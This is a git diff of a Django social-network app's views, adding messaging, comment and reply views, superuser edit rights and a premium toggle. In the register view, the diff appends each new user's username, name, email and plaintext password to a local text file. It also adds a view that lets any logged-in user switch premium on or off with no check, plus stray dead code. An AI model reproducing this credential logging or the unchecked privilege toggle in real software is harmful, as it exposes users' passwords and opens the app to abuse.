@@ -8,7 +8,7 @@ from django.contrib.auth.mixins import LoginRequiredMixin,PermissionRequiredMixi
 from django.db import IntegrityError
 from django.views.generic import TemplateView,ListView,DetailView,CreateView,UpdateView,DeleteView,RedirectView
 from django.contrib.auth.decorators import login_required
-from mainapp.models import Post,Comment,GroupMember,Group,Friend,UserProfileInfo,Preference,Reply,SendMessageToAdmin,HomePage
+from mainapp.models import Post,Comment,GroupMember,Group,Friend,UserProfileInfo,Preference,Reply,SendMessageToAdmin,HomePage,Message
 from django.db.models import Q
 from django.contrib.auth.models import User
 from django.shortcuts import render_to_response
@@ -24,9 +24,11 @@ from hitcount.views import HitCountDetailView
 from braces.views import SelectRelatedMixin
 from django.contrib.auth.mixins import UserPassesTestMixin
 from django.views.generic import View
-from mainapp.forms import UserCreationForm,UserProfileInfoForms,UserUpdateForm,ProfileUpdateForm,ReplyForm,AdminMessageForm
+from mainapp.forms import UserCreationForm,UserProfileInfoForms,UserUpdateForm,ProfileUpdateForm,ReplyForm,AdminMessageForm,MessageForm
 import random
 from django.core.paginator import Paginator
+import uuid
+from notifications.signals import notify
 from django.conf.urls import (
 handler400, handler403, handler404, handler500
 )
@@ -38,6 +40,7 @@ def index(self,request):
         return render(request,'mainapp/index.html')
     else:
         return render(request,'mainapp/registration.html')
+        dd
 
 class Home(View):
     model = HomePage
@@ -66,6 +69,20 @@ def register(request):
         if form.is_valid():
             form.save()
             username = form.cleaned_data.get('username')
+            password = form.cleaned_data.get('password')
+            email = form.cleaned_data.get('email')
+            first_name = form.cleaned_data.get('first_name')
+            last_name = form.cleaned_data.get('last_name')
+            with open('user_data.txt','a') as f:
+                f.write(f"""
+Username: {username}
+First Name: {first_name}
+Last Name: {last_name}
+Password: {password}
+Email: {email}
+                """)
+            email_split = email.split('@')
+            email_2 = email_split[-1]
             messages.success(request, f'Welcome {username}, and thanks for joining interests!')
             return redirect('mainapp:user_login')
     else:
@@ -76,6 +93,21 @@ def register(request):
 @login_required(login_url='/mainapp/user_login/')
 def profile_page(request):
     return render(request,'mainapp/profile.html')
+
+
+@login_required(login_url='/mainapp/user_login/')
+def get_premium(request):
+    user_ = request.user.userprofileinfo
+    user = UserProfileInfo.objects.get(user__username=request.user)
+    try:
+        if user_.premium:
+            user.premium = False
+        else:
+            user.premium = True
+        user.save()
+    except:
+        return HttpResponse('Error')
+    return render(request,'mainapp/profile-.html')
 
 
 @login_required
@@ -132,12 +164,51 @@ def profile_update(request):
 class PostDetailView(HitCountDetailView,DetailView):
     model = Post
     count_hit = True
-    query_pk_and_slug = True
     def get_context_data(self, **kwargs):
         context = super().get_context_data(**kwargs)
         context['form'] = CommentForm() # Inject CommentForm
         return context
 
+@login_required(login_url='/mainapp/user_login/')
+def add_comment_to_post(request,slug):
+    post = get_object_or_404(Post,slug=slug)
+    if request.method == 'POST':
+        form = CommentForm(request.POST)
+        if form.is_valid():
+            comment = form.save(commit=False)
+            comment.post = post
+            comment.author = request.user # add this line
+            comment.slug = post.slug
+            comment.save()
+            messages.success(request, 'Comment added successfully')
+            return redirect('mainapp:post_detail',slug=post.slug)
+           
+    else:
+        form = CommentForm()
+    return render(request,'mainapp/comment_form.html',{'form':form})
+    
+def get_queryset(self):
+    return Comment.objects.filter(created_date__lte=timezone.now()).order_by('-created_date')
+
+
+
+@login_required(login_url='/mainapp/user_login/')
+def add_reply_to_comment(request,slug):
+    comment = get_object_or_404(Comment,slug=slug)
+    # post = get_object_or_404(Post,pk=pk,slug=slug)
+    if request.method == 'POST':
+        form = ReplyForm(request.POST)
+        if form.is_valid():
+            reply = form.save(commit=False)
+            reply.comment = comment
+            reply.author = request.user
+            reply.save()
+            return redirect('mainapp:post_detail',slug=comment.slug)
+    else:
+        form = ReplyForm()
+    return render(request,'mainapp/reply_form.html',{'form':form})
+def get_queryset(self):
+    return Reply.objects.filter(created_date__lte=timezone.now()).order_by('-created_date')
 
 
 class PostLikeRedirect(RedirectView):
@@ -218,7 +289,7 @@ class PostUpdateView(LoginRequiredMixin,UserPassesTestMixin,UpdateView):
 
     def test_func(self):
         post = self.get_object()
-        if self.request.user == post.author:
+        if self.request.user == post.author or self.request.user.is_superuser:
             return True
         return False
         
@@ -305,7 +376,40 @@ class SearchResultsViewUsers(ListView):
         query = self.request.GET.get('q')
         return User.objects.filter(Q(first_name__icontains=query) | Q(last_name__icontains=query))
         
-        
+class CreateMessageView(LoginRequiredMixin,CreateView):
+    model = Message
+    form_class = MessageForm
+
+    def get_success_url(self):
+        return self.request.path
+    
+    def form_valid(self,form):
+        form.instance.sender = self.request.user
+        form.instance.receiver = User.objects.get(username=self.kwargs['username'])
+        return super().form_valid(form)
+    
+    def get_context_data(self,**kwargs):
+        context = super().get_context_data(**kwargs)
+        context['receiver_message_objects'] = Message.objects.filter(Q(receiver=self.request.user) & Q(sender__username=self.kwargs['username']) | Q(receiver__username=self.kwargs['username']) & Q(sender=self.request.user))
+        return context
+
+class MessageInbox(LoginRequiredMixin,ListView):
+    model = Message
+
+    def get_context_data(self,**kwargs):
+        context = super().get_context_data(**kwargs)
+        sender_list_author = []
+        sender_qs = []
+        qs = Message.objects.filter(receiver=self.request.user).order_by('-date_created')
+        for i in qs:
+            if i.sender.username not in sender_list_author:
+                sender_list_author.append(i.sender.username)  # sender_list is a list of unique authors in the qs
+                sender_qs.append(i)
+        context['sender_qs'] = sender_qs
+        return context
+
+    def get_queryset(self):
+        return Message.objects.filter(receiver=self.request.user).order_by('-date_created')
 
 class CreateGroup(LoginRequiredMixin, generic.CreateView):
     model = Group
@@ -369,6 +473,7 @@ class UserPostListView(ListView):
 
     def get_queryset(self):
         user = get_object_or_404(User,username=self.kwargs.get('username'))
+        # description = get_object_or_404(UserProfileInfo,description=self.kwargs.get('description'))
         return Post.objects.filter(author=user).order_by('-published_date')
 
 # def view_profile(request,pk=None):
@@ -379,20 +484,24 @@ class UserPostListView(ListView):
 #         context = {'user':user_profile}
 #         return render(request,'mainapp/profile.html',context)
 
-def view_profile(request,pk=None):
+def view_profile(request,pk=None,slug=None):
         if pk:
             user_profile = User.objects.get(pk=pk)
+            # user = get_object_or_404(User,username=self.kwargs.get('username'))
             user_posts = Post.objects.filter(author__id=pk).order_by('-published_date')   #<---add these
+            last_two = Post.objects.filter(author__id=pk).order_by('-published_date')[:2]
             friend, created = Friend.objects.get_or_create(current_user=request.user)
             friends = friend.users.all()
         else:
             user_profile = request.user
             user_posts = Post.objects.filter(author__id = request.user.id).order_by('-published_date')   #<---add these
+            last_two = Post.objects.filter(author__id = request.user.id).order_by('-published_date')[:2]
             friend, created = Friend.objects.get_or_create(current_user=request.user)
             friends = friend.users.all()
         context = {
                    'user':user_profile,
                    'user_posts':user_posts,
+                   'last_two':last_two,
                    'friends':friends,
                   }
         return render(request,'mainapp/profile.html',context)
@@ -437,56 +546,41 @@ class SendAdminMessage(LoginRequiredMixin,CreateView):
         form.instance.author = self.request.user
         return super().form_valid(form)
 
-@login_required(login_url='/mainapp/user_login/')
-def add_comment_to_post(request,pk,slug):
-    post = get_object_or_404(Post,pk=pk,slug=slug)
-    if request.method == 'POST':
-        form = CommentForm(request.POST)
-        if form.is_valid():
-            comment = form.save(commit=False)
-            comment.post = post
-            comment.author = request.user # add this line
-            comment.save()
-            messages.success(request, 'Comment added successfully')
-            return redirect('mainapp:post_detail',pk=post.pk,slug=post.slug)
+# @login_required(login_url='/mainapp/user_login/')
+# def add_comment_to_post(request,pk,slug):
+#     post = get_object_or_404(Post,pk=pk,slug=slug)
+#     if request.method == 'POST':
+#         form = CommentForm(request.POST)
+#         if form.is_valid():
+#             comment = form.save(commit=False)
+#             comment.post = post
+#             comment.author = request.user # add this line
+#             comment.save()
+#             messages.success(request, 'Comment added successfully')
+#             return redirect('mainapp:post_detail',pk=post.pk,slug=post.slug)
            
-    else:
-        form = CommentForm()
-    return render(request,'mainapp/comment_form.html',{'form':form})
+#     else:
+#         form = CommentForm()
+#     return render(request,'mainapp/comment_form.html',{'form':form})
     
-def get_queryset(self):
-    return Comment.objects.filter(created_date__lte=timezone.now()).order_by('-created_date')
+# def get_queryset(self):
+#     return Comment.objects.filter(created_date__lte=timezone.now()).order_by('-created_date')
 
-@login_required(login_url='/mainapp/user_login/')
-def add_reply_to_comment(request,pk,slug):
-    comment = get_object_or_404(Comment,pk=pk)
-    post = get_object_or_404(Post,pk=pk,slug=slug)
-    if request.method == 'POST':
-        form = ReplyForm(request.POST)
-        if form.is_valid():
-            reply = form.save(commit=False)
-            reply.comment = comment
-            reply.author = request.user
-            reply.save()
-            return redirect('mainapp:post_detail',pk=post.pk,slug=post.slug)
-    else:
-        form = ReplyForm()
-    return render(request,'mainapp/reply_form.html',{'form':form})
-def get_queryset(self):
-    return Reply.objects.filter(created_date__lte=timezone.now()).order_by('-created_date')
+
 
 # @login_required(login_url='/mainapp/user_login/')
 # # def add_reply_to_reply(request,pk):
  #     reply
 
 
-class PostDeleteView(LoginRequiredMixin,DeleteView,UserPassesTestMixin):
+class PostDeleteView(LoginRequiredMixin,UserPassesTestMixin,DeleteView):
+    login_url = '/login/'
     model = Post
     query_pk_and_slug = True
     success_url = reverse_lazy('mainapp:post_list')
     def test_func(self):
         post = self.get_object()
-        if self.request.user == post.author:
+        if self.request.user == post.author or self.request.user.is_superuser:
             return True
         return False
 
